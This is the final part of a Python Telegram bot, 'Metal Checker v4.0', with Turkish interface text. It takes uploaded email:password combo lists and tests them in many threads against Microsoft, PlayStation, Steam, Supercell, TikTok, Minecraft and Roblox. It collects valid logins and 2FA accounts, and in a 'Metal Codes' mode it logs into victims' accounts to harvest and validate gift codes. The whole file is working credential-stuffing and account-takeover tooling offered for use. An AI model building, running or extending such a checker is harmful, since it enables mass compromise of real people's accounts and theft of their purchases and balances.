                        if status in ["VALID", "VALID_REQUIRES_CARD", "BALANCE_CODE"]:
                            stats.update_codes(valid_str=msg_str)
                            result_mgr.save_code_result(msg_str, "valid")
                        else:
                            stats.update_codes(invalid_count=1)
                            result_mgr.save_code_result(msg_str, "invalid")
                    except:
                        stats.update_codes(invalid_count=1)
                    finally:
                        stats.update("CHECKED")

                with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
                    for code in fetched_codes_list:
                        if stop_flags.get(chat_id, False): break
                        executor.submit(validate_worker, code)
                
                val_session.close()
            else:
                bot.send_message(chat_id, "⚠️ Validator için çalışan aktif bir MS hesabı bulunamadı. Sadece fetch edildi.")

        active_tasks[chat_id] = False
        updater_thread.join()

        try: bot.edit_message_text(stats.generate_text() + "\n\n✅ *İŞLEM TAMAMLANDI!*", chat_id, stats.message_id, parse_mode="Markdown")
        except: pass

        bot.send_message(chat_id, "📦 Metal Codes paketi hazırlanıyor...")
        files_to_send, is_zip = result_mgr.get_delivery_files()
        
        if files_to_send:
            for f_path in files_to_send:
                with open(f_path, 'rb') as f:
                    bot.send_document(chat_id, f, caption=f"🔥 *METAL CODES - {os.path.basename(f_path)}*", parse_mode="Markdown")
                try: os.remove(f_path)
                except: pass
        else:
            bot.send_message(chat_id, "ℹ️ Gönderilecek dosya bulunamadı veya işlem sırasında kod çekilemedi.")
        
        try: shutil.rmtree(result_mgr.base_folder)
        except: pass
            
        user_states[chat_id] = "IDLE"
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ciddi bir hata oluştu: {str(e)}")
        active_tasks[chat_id] = False
        user_states[chat_id] = "IDLE"

def run_code_sorter(chat_id, content):
    try:
        lines = [l.strip() for l in content.split('\n') if l.strip()]
        if not lines:
            bot.send_message(chat_id, "❌ Dosya boş.")
            return
            
        tools = XboxCodeTools()
        game_groups = {}
        for code_line in lines:
            if '|' in code_line:
                code, game_name = code_line.split('|', 1)
                code = code.strip()
                game_name = game_name.strip()
                game_type = tools.extract_game_type(game_name)
                if game_type not in game_groups: game_groups[game_type] = []
                game_groups[game_type].append((code, game_name))
            else:
                if 'Other' not in game_groups: game_groups['Other'] = []
                game_groups['Other'].append((code_line.strip(), 'Unknown'))
                
        formatted_output = tools.format_game_codes_output(game_groups)
        
        filename = "sorted_codes.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(formatted_output)
            
        with open(filename, 'rb') as f:
            bot.send_document(chat_id, f, caption="✅ *Kodlar Başarıyla Sortlandı!*", parse_mode="Markdown")
            
        os.remove(filename)
        user_states[chat_id] = "IDLE"
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Sort işlemi başarısız: {str(e)}")
        user_states[chat_id] = "IDLE"

# -----------------------------------------
# TELEGRAM BOT HANDLERS & MENUS
# -----------------------------------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = "IDLE"
    user_configs[chat_id] = {"mode": "both", "api": 2, "threads": 10}
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🚀 Metal Checker Başlat", callback_data="menu_services"))
    markup.add(InlineKeyboardButton("🎁 Metal Codes", callback_data="menu_codes"))
    
    bot.send_message(
        chat_id, 
        "🤘 *Metal Drops & Icardi Sunar: METAL CHECKER v4.0*\n\nSınır yok, HWID yok. Hem hesap checker hem kod fetcher aktif. Seçimini yap.",
        parse_mode="Markdown", reply_markup=markup
    )

@bot.message_handler(commands=['stop'])
def stop_checker(message):
    chat_id = message.chat.id
    if chat_id in active_tasks and active_tasks[chat_id]:
        stop_flags[chat_id] = True
        bot.send_message(chat_id, "🛑 İşlem durduruluyor... Kalan sonuçlar paketlenip gönderilecek.")
    else:
        bot.send_message(chat_id, "Şu an çalışan bir işlem yok.")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    data = call.data
    
    # --- MENUS ---
    if data == "menu_services":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("1. Microsoft Subs", callback_data="srv_microsoft"),
            InlineKeyboardButton("2. PlayStation", callback_data="srv_psn"),
            InlineKeyboardButton("3. Steam", callback_data="srv_steam"),
            InlineKeyboardButton("4. Supercell", callback_data="srv_supercell"),
            InlineKeyboardButton("5. TikTok", callback_data="srv_tiktok"),
            InlineKeyboardButton("6. Minecraft", callback_data="srv_minecraft"),
            InlineKeyboardButton("7. Full Scan (.ZIP)", callback_data="srv_both"),
            InlineKeyboardButton("8. Roblox", callback_data="srv_roblox")
        )
        bot.edit_message_text("🎯 *SERVICE SELECTION*\nHangi servisleri vurmak istersin?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        
    elif data == "menu_codes":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("1. Fetch Codes", callback_data="code_fetch"),
            InlineKeyboardButton("2. Fetch & Validate Codes", callback_data="code_fetch_val"),
            InlineKeyboardButton("3. Sort Codes", callback_data="code_sort")
        )
        bot.edit_message_text("🎁 *METAL CODES ENGINE*\nSınırsız ve HWID'siz Kod Çekici. Seçimini yap:", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    # --- CODE HANDLERS ---
    elif data in ["code_fetch", "code_fetch_val"]:
        user_configs[chat_id]["mode"] = data
        markup = InlineKeyboardMarkup(row_width=3)
        markup.add(
            InlineKeyboardButton("10 Thread", callback_data="thr_10"),
            InlineKeyboardButton("30 Thread", callback_data="thr_30"),
            InlineKeyboardButton("50 Thread", callback_data="thr_50"),
            InlineKeyboardButton("100 Thread", callback_data="thr_100")
        )
        bot.edit_message_text("🚀 *THREADING*\nKaç eşzamanlı koldan hesaplara girelim?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        
    elif data == "code_sort":
        user_configs[chat_id]["mode"] = data
        user_states[chat_id] = "WAITING_FOR_SORT_FILE"
        bot.edit_message_text("📂 *KODLARI SIRALA*\nİçinde daha önceden çektiğin kodların bulunduğu (.txt) formatındaki dosyayı gönder.", chat_id, call.message.message_id, parse_mode="Markdown")

    # --- REGULAR SERVICES HANDLERS ---
    elif data.startswith("srv_"):
        mode = data.split("_")[1]
        user_configs[chat_id]["mode"] = mode
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("1. Full API", callback_data="api_1"),
            InlineKeyboardButton("2. Fast API (Önerilen)", callback_data="api_2"),
            InlineKeyboardButton("3. Minimal API", callback_data="api_3")
        )
        bot.edit_message_text("⚙️ *API MODE*\nAPI hızı/kalitesi ne olsun?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        
    elif data.startswith("api_"):
        api_lvl = int(data.split("_")[1])
        user_configs[chat_id]["api"] = api_lvl
        
        markup = InlineKeyboardMarkup(row_width=3)
        markup.add(
            InlineKeyboardButton("10 Thread", callback_data="thr_10"),
            InlineKeyboardButton("30 Thread", callback_data="thr_30"),
            InlineKeyboardButton("50 Thread", callback_data="thr_50"),
            InlineKeyboardButton("100 Thread", callback_data="thr_100")
        )
        bot.edit_message_text("🚀 *THREADING*\nKaç eşzamanlı koldan saldıralım?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    elif data.startswith("thr_"):
        threads = int(data.split("_")[1])
        user_configs[chat_id]["threads"] = threads
        user_states[chat_id] = "WAITING_FOR_COMBO"
        
        mode_text = user_configs[chat_id]['mode'].upper()
        bot.edit_message_text(
            f"✅ *SİSTEM HAZIR!*\n\n"
            f"Mod: `{mode_text}`\n"
            f"Threads: `{threads}`\n\n"
            f"🔥 *Şimdi dosyayı (.txt) veya listeyi gönder.* Geldiği an işlemler otomatik başlayacak. Durdurmak için `/stop` yaz.",
            chat_id, call.message.message_id, parse_mode="Markdown"
        )

@bot.message_handler(content_types=['document', 'text'])
def handle_combo(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    
    if state not in ["WAITING_FOR_COMBO", "WAITING_FOR_SORT_FILE"]: return
        
    content = ""
    if message.content_type == 'document':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        try: content = downloaded_file.decode('utf-8')
        except:
            bot.send_message(chat_id, "❌ Dosya okunamadı. UTF-8 formatında geçerli bir txt gönder.")
            return
    elif message.content_type == 'text':
        content = message.text

    if state == "WAITING_FOR_SORT_FILE":
        run_code_sorter(chat_id, content)
        return

    # Normal Combo İşlemleri
    lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
    if not lines:
        bot.send_message(chat_id, "❌ Combolar bulunamadı. 'email:pass' formatında bir şeyler at.")
        return
        
    user_states[chat_id] = "CHECKING"
    stop_flags[chat_id] = False
    active_tasks[chat_id] = True
    config = user_configs[chat_id]
    
    # Eğer yeni METAL CODES sistemiyse oraya yönlendir, değilse klasik CHECKER sistemini başlat.
    if config["mode"] in ["code_fetch", "code_fetch_val"]:
        accounts = []
        for line in lines:
            parts = line.split(':', 1)
            if len(parts) == 2: accounts.append((parts[0].strip(), parts[1].strip()))
        
        Thread(target=run_code_operations, args=(chat_id, accounts, config)).start()
        return

    # Klasik Checker
    result_mgr = ResultManager(chat_id, config["mode"])
    stats = LiveStats(len(lines), chat_id, config["mode"])
    
    msg = bot.send_message(chat_id, stats.generate_text(), parse_mode="Markdown")
    stats.message_id = msg.message_id
    
    def process_line(line):
        if stop_flags.get(chat_id, False): return
        try:
            parts = line.split(':', 1)
            if len(parts) != 2: 
                stats.update("BAD")
                return
            checker = UnifiedChecker(api_mode=config["api"], check_mode=config["mode"])
            res = checker.check(parts[0].strip(), parts[1].strip())
            stats.update(res["status"], res if res["status"] == "HIT" else None)
            
            if res["status"] == "HIT": result_mgr.save_hit(res)
            elif res["status"] == "2FA": result_mgr.save_2fa(parts[0].strip(), parts[1].strip())
        except: stats.update("ERROR")

    def ui_updater():
        while active_tasks.get(chat_id, False):
            time.sleep(2.0)
            if not active_tasks.get(chat_id, False): break 
            try: bot.edit_message_text(stats.generate_text(), chat_id, stats.message_id, parse_mode="Markdown")
            except: pass

    updater_thread = Thread(target=ui_updater)
    updater_thread.start()

    with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
        for line in lines:
            if stop_flags.get(chat_id, False): break
            executor.submit(process_line, line)
            
    active_tasks[chat_id] = False
    updater_thread.join()
    
    try: bot.edit_message_text(stats.generate_text() + "\n\n✅ *TARAMA BİTTİ VEYA DURDURULDU!*", chat_id, stats.message_id, parse_mode="Markdown")
    except: pass
    
    bot.send_message(chat_id, "📦 Sonuçlar paketleniyor (Ayarlarına göre TXT veya ZIP)...")
    
    files_to_send, is_zip = result_mgr.get_delivery_files()
    if is_zip and files_to_send:
        with open(files_to_send[0], 'rb') as f:
            bot.send_document(chat_id, f, caption="🔥 *METAL CHECKER - FULL SCAN (.ZIP)*", parse_mode="Markdown")
    elif files_to_send:
        for f_path in files_to_send:
            with open(f_path, 'rb') as f:
                name_clean = os.path.basename(f_path).replace('_', '\\_')
                bot.send_document(chat_id, f, caption=f"🔥 *METAL CHECKER - {name_clean}*", parse_mode="Markdown")
    else:
        bot.send_message(chat_id, "ℹ️ Hiç hit çıkmadı veya kaydedilecek bir dosya oluşmadı.")
        
    try: shutil.rmtree(result_mgr.base_folder)
    except: pass
    if is_zip and files_to_send:
        try: os.remove(files_to_send[0])
        except: pass
    
    user_states[chat_id] = "IDLE"

if __name__ == "__main__":
    print("[DEBUG] Eski oturumlar ve çakışmalar zorla temizleniyor...")
    try:
        bot.remove_webhook()
        time.sleep(1)
    except Exception as e:
        print(f"[DEBUG] Webhook temizleme atlandı: {e}")
        pass
        
    print("[DEBUG] Metal Checker v4.0 (Fetcher Edition) Bot Başlatılıyor...")
    bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)

